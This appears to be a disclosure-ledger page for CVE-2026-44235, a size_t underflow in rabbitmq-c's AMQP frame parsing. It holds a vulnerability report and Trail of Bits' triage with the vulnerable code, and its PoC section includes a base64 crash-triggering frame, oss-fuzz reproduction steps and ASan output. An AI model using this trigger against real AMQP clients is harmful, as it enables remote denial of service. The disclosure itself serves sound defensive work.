@@ -1,0 +1,231 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ANT-2026-GTGXBRXN · rabbitmq-c</title>
+<link rel="icon" type="image/x-icon" href="/anthropic-serve/favicon.ico">
+<script>(function(){try{var t=localStorage.getItem("cvd_theme");if(t==="light"||t==="dark")document.documentElement.setAttribute("data-theme",t);}catch(e){}})();</script>
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="stylesheet" href="../assets/ledger.css">
+</head>
+<body>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MT0111843S"></script><script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+  gtag('config', 'G-MT0111843S');
+</script>
+<main>
+<h1>ANT-2026-GTGXBRXN · rabbitmq-c</h1>
+<nav class="site-nav muted">
+<a href="../index.html">Overview</a>  ·
+<a href="../ledger/index.html">Ledger</a>  ·
+<a href="../archive/index.html">Archive</a>  ·
+<a href="../about/index.html">About</a>  <span class="theme-toggle">
+    <button type="button" data-set-theme="light">Light</button>
+    <button type="button" data-set-theme="dark">Dark</button>
+    <button type="button" data-set-theme="system">System</button>
+  </span>
+</nav>
+<h2>
+  oob-read
+  <span class="sev-badge sev-medium">medium</span>
+</h2>
+
+<p class="id-badges">
+  <a class="id-badge" href="https://nvd.nist.gov/vuln/detail/CVE-2026-44235">CVE-2026-44235</a>
+</p>
+
+<p class="sev-compare">
+  <span class="sev-compare-label">Severity</span>
+  <span class="sev-compare-item">Claude <span class="sev-chip sev-medium">medium</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Security research firm <span class="sev-chip sev-medium">medium</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Maintainer <span class="sev-chip sev-unknown">-</span></span>
+</p>
+
+<p class="attribution">Discovered by
+<span class="model-chip">Claude Mythos Preview</span></p>
+
+
+<div class="marker">REPORT</div>
+<p class="section-intro">Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Trail of Bits.</p>
+<div class="report-body" tabindex="0"><h1>ANT-2026-GTGXBRXN: size_t underflow in AMQP frame length computation leading to massive out-of-bounds read</h1>
+<p>A size_t underflow when computing the length of an AMQP frame results in a massive out-of-bounds read.</p>
+<h2>Target</h2>
+<p><strong>Project:</strong> rabbitmq-c<br>
+<strong>Discovery:</strong> static analysis — not yet dynamically reproduced  </p>
+<h2>Reproduction</h2>
+<p>This finding was identified by static analysis and has not yet been dynamically reproduced. A trigger input is not included.</p>
+<p><em>[No reproducer or sanitizer output attached — request from security-cvd@anthropic.com if needed.]</em></p>
+<h2>Acknowledgement</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-GTGXBRXN.</p>
+<hr>
+<p><strong>Reference:</strong> ANT-2026-GTGXBRXN<br>
+<strong>Anthropic CVD Policy:</strong> https://www.anthropic.com/coordinated-vulnerability-disclosure</p></div>
+
+<div class="marker">SECURITY RESEARCH FIRM ANALYSIS</div>
+<p class="section-intro">Triage and disclosure were performed by Trail of Bits. The writeup below is the document the firm sent to the maintainer.</p>
+<dl class="vendor-analysis">
+<dt>Verdict</dt><dd><span class="verdict-chip verdict-tp">true positive</span></dd><dt>Severity</dt><dd class="sev-medium">medium</dd></dl>
+<div class="report-body" tabindex="0"><h3>Summary</h3>
+<p>A malicious AMQP server can send an undersized AMQP frame to a rabbitmq-c client and trigger an unsigned <code>size_t</code> underflow during frame parsing. The underflowed length is then used by the AMQP properties and table decoder, leading to an out-of-bounds read and process crash.</p>
+<p>The issue is reachable during the client login flow when a victim application connects to an attacker-controlled AMQP server, or when an active network attacker can modify traffic on an unencrypted AMQP connection.</p>
+<h3>Details</h3>
+<p>The vulnerable code is in <code>librabbitmq/amqp_connection.c</code>, inside <code>amqp_handle_input()</code>.</p>
+<p>For AMQP HEADER frames, the parser computes the encoded properties length like this:</p>
+<pre tabindex="0"><code class="language-c">encoded.bytes = amqp_offset(raw_frame, HEADER_SIZE + 12);
+encoded.len = state-&gt;target_size - HEADER_SIZE - 12 - FOOTER_SIZE;
+</code></pre>
+<p><code>encoded.len</code> is a <code>size_t</code>. If <code>state-&gt;target_size</code> is smaller than <code>HEADER_SIZE + 12 + FOOTER_SIZE</code>, the subtraction wraps to a very large unsigned value.</p>
+<p>For example, the verified testcase uses a HEADER frame where <code>state-&gt;target_size</code> is 19 bytes:</p>
+<pre tabindex="0"><code class="language-text">19 - 7 - 12 - 1 = -1
+</code></pre>
+<p>As an unsigned <code>size_t</code>, this becomes <code>0xffffffffffffffff</code>. The value is passed into <code>amqp_decode_properties()</code> and then into the table decoder. Bounds checks that compare offsets against <code>encoded.len</code> no longer stop the parser, so it reads far past the received frame buffer and crashes.</p>
+<p>The same pattern exists for METHOD frames:</p>
+<pre tabindex="0"><code class="language-c">encoded.len = state-&gt;target_size - HEADER_SIZE - 4 - FOOTER_SIZE;
+</code></pre>
+<h3>PoC</h3>
+<p>The testcase was verified against the commit above with the oss-fuzz <code>fuzz_server</code> target built with AddressSanitizer.</p>
+<p>Build the fuzzer:</p>
+<pre tabindex="0"><code class="language-bash">git clone https://github.com/google/oss-fuzz.git
+cd oss-fuzz
+</code></pre>
+<p>Pin <code>projects/rabbitmq-c/Dockerfile</code> to the validated vulnerable commit:</p>
+<pre tabindex="0"><code class="language-dockerfile">RUN git clone https://github.com/alanxz/rabbitmq-c librabbitmq/ &amp;&amp; \
+    cd librabbitmq &amp;&amp; \
+    git checkout 8b7471eab8d09536b3c104dbb30a65699cf48104
+</code></pre>
+<p>Then build:</p>
+<pre tabindex="0"><code class="language-bash">python3 infra/helper.py build_fuzzers --sanitizer address rabbitmq-c
+</code></pre>
+<p>Save the attached testcase in the <code>oss-fuzz</code> directory as <code>reproducer.bin</code>, then run:</p>
+<pre tabindex="0"><code class="language-bash">printf '%s' 'AQAAAAAAVgAKAAoACQAAADo3SyAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFPeqzawAAAAAAAAAAAAAHQBAAAABVBMQUlOAAAABWVuX1VTzgIAAAAAAAsAPAAAAAAAAAAAAM4=' | base64 -d &gt; reproducer.bin
+
+python3 infra/helper.py reproduce rabbitmq-c fuzz_server ./reproducer.bin
+</code></pre>
+<p>Expected result: AddressSanitizer reports a <code>SEGV</code> caused by a READ in <code>amqp_d8</code>, reached from <code>amqp_decode_table_internal()</code> after <code>encoded.len</code> underflows to <code>0xffffffffffffffff</code>.</p>
+<p><strong>We have attached a zip containing:</strong></p>
+<ul>
+<li>Full technical details of each finding</li>
+<li>Reproduction steps and proof-of-concept where applicable</li>
+<li>Candidate patch(es) with regression tests</li>
+</ul>
+<h3>Sanitizer output</h3>
+<pre tabindex="0"><code class="language-text">AddressSanitizer:DEADLYSIGNAL
+=================================================================
+==14==ERROR: AddressSanitizer: SEGV on unknown address 0x7f10dccbbeef
+==14==The signal is caused by a READ memory access.
+SCARINESS: 20 (wild-addr-read)
+    #0 0x55555574a8e0 in amqp_d8 librabbitmq/amqp_private.h:219:3
+    #1 0x55555574a8e0 in amqp_decode_8 librabbitmq/amqp_private.h:287:1
+    #2 0x55555574a8e0 in amqp_decode_table_internal librabbitmq/amqp_table.c:124:10
+    #3 0x555555732eaf in amqp_decode_properties librabbitmq/amqp_framing.c:1505:21
+    #4 0x555555726ffe in amqp_handle_input librabbitmq/amqp_connection.c:347:17
+    #5 0x555555745ec9 in consume_one_frame librabbitmq/amqp_socket.c:638:9
+    #6 0x555555745ec9 in wait_frame_inner librabbitmq/amqp_socket.c:747:13
+    #7 0x555555749efb in amqp_simple_wait_frame_noblock librabbitmq/amqp_socket.c:929:12
+    #8 0x555555749efb in amqp_simple_wait_method_list librabbitmq/amqp_socket.c:947:9
+    #9 0x5555557490fc in amqp_login_inner librabbitmq/amqp_socket.c:1349:11
+    #10 0x55555574861a in amqp_login librabbitmq/amqp_socket.c:1444:9
+    #11 0x555555723f37 in client fuzz/fuzz_server.c:149:3
+    #12 0x555555723d03 in LLVMFuzzerTestOneInput fuzz/fuzz_server.c:117:3
+
+DEDUP_TOKEN: amqp_d8--amqp_decode_8--amqp_decode_table_internal
+==14==Register values:
+rax = 0x0000000000000000  rbx = 0xffffffffffffffff  rcx = 0x0000000000000021  rdx = 0x00000000000009c8
+rdi = 0x0000080000000000  rsi = 0x0000000200000000  rbp = 0x00007ffffffceb70  rsp = 0x00007ffffffceaf0
+ r8 = 0x00005555557cdc00   r9 = 0x0000000000000021  r10 = 0x00007fffffffff01  r11 = 0x0000000000000001
+r12 = 0x00007f10dccbbeef  r13 = 0x00000000deab36dd  r14 = 0x00007ffffec40460  r15 = 0x00000000ffffff06
+AddressSanitizer can not provide additional info.
+SUMMARY: AddressSanitizer: SEGV librabbitmq/amqp_private.h:219:3 in amqp_d8
+==14==ABORTING
+</code></pre>
+<h3>Impact</h3>
+<p>Any application using rabbitmq-c as an AMQP client can be affected if it connects to an attacker-controlled AMQP server. An active network attacker may also be able to trigger the issue when the connection is not protected by TLS with certificate validation.</p>
+<p>The demonstrated impact is client-side denial of service through a remote out-of-bounds read and crash. The reproduced crash shows attacker-influenced parsing state and an underflowed length of <code>0xffffffffffffffff</code>, but this analysis does not show reliable memory disclosure or code execution.</p>
+<p><strong>Background of that issue</strong>
+This bug was found as a part of an Anthropic research into the use of large language models for automated vulnerability discovery in open source software. Anthropic then engaged Trail of Bits to independently triage and validate those issues.</p>
+<p>Thank you for your work on rabbitmq-c!</p></div>
+
+
+
+
+
+<div class="marker">TIMELINE</div>
+<p class="section-intro">Recorded dates, in order.</p>
+<div class="figure">
+  <ol class="timeline">
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-03-29</span>
+      <span class="timeline-label">Discovered or logged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-04-09</span>
+      <span class="timeline-label">Sent to maintainer</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-07</span>
+      <span class="timeline-label">Maintainer acknowledged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-07</span>
+      <span class="timeline-label">Patch released</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-08-17</span>
+      <span class="timeline-label">Publicly revealed</span>
+    </li>
+  </ol>
+</div>
+
+<div class="marker">PROVENANCE</div>
+<p class="kicker">SHA-3-512 hash:</p>
+<p class="hash full">3033221594ae12c1cf323741eecb09d2bcd009e6ee6b2b7e464106d5bd6e6e7766637589d331edbd33be4041134f0722bc6d23d07a39887eed90541a0c797f77</p>
+<p class="kicker">Committed 2026-04-09 18:50 UTC</p>
+<p class="kicker">Revealed 2026-08-17 17:47 UTC</p>
+<p class="kicker">
+  <a download="ANT-2026-GTGXBRXN-preimage.json"
+     href="data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-GTGXBRXN%22%2C%22bug_class%22%3A%22Integer%20Underflow%22%2C%22claude_severity%22%3A%22medium%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-03-29T20%3A43%3A24%2B00%3A00%22%2C%22description%22%3A%22A%20size_t%20underflow%20when%20computing%20the%20length%20of%20an%20AMQP%20frame%20results%20in%20a%20massive%20out-of-bounds%20read.%22%2C%22discovered_at%22%3Anull%2C%22location%22%3Anull%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22rabbitmq-c%22%2C%22reproduction%22%3Anull%2C%22technical_details%22%3Anull%2C%22title%22%3A%22size_t%20underflow%20in%20AMQP%20frame%20length%20computation%20leading%20to%20massive%20out-of-bounds%20read%22%2C%22vendor_severity%22%3A%22medium%22%7D">Verify (download preimage.json)</a>
+</p>
+<details class="preimage">
+  <summary>Show preimage JSON</summary>
+  <pre class="preimage-body">{
+  &#34;ant_id&#34;: &#34;ANT-2026-GTGXBRXN&#34;,
+  &#34;bug_class&#34;: &#34;Integer Underflow&#34;,
+  &#34;claude_severity&#34;: &#34;medium&#34;,
+  &#34;commit_sha&#34;: null,
+  &#34;created_at&#34;: &#34;2026-03-29T20:43:24+00:00&#34;,
+  &#34;description&#34;: &#34;A size_t underflow when computing the length of an AMQP frame results in a massive out-of-bounds read.&#34;,
+  &#34;discovered_at&#34;: null,
+  &#34;location&#34;: null,
+  &#34;poc_sha256&#34;: null,
+  &#34;preimage_version&#34;: 1,
+  &#34;project&#34;: &#34;rabbitmq-c&#34;,
+  &#34;reproduction&#34;: null,
+  &#34;technical_details&#34;: null,
+  &#34;title&#34;: &#34;size_t underflow in AMQP frame length computation leading to massive out-of-bounds read&#34;,
+  &#34;vendor_severity&#34;: &#34;medium&#34;
+}</pre>
+</details>
+</main>
+<footer>
+  <p>Anthropic Frontier Red Team</p>
+  <p>Snapshot generated at 2026-11-02 19:30 UTC</p>
+  <p>Dates and times are in UTC</p>
+  <p>Manifest hash <code>25d811e7b56632ef5bbb23eb…</code></p>
+  <p>Archived snapshots remain available at their dated paths so any figure can be verified against the page that was live on that date</p>
+  <p><a href="../data/payload.json">payload.json</a></p>
+</footer>
+<script src="../assets/figures.js" data-root="../"></script>
+<script src="../assets/ledger.js"></script>
+</body>
+</html>
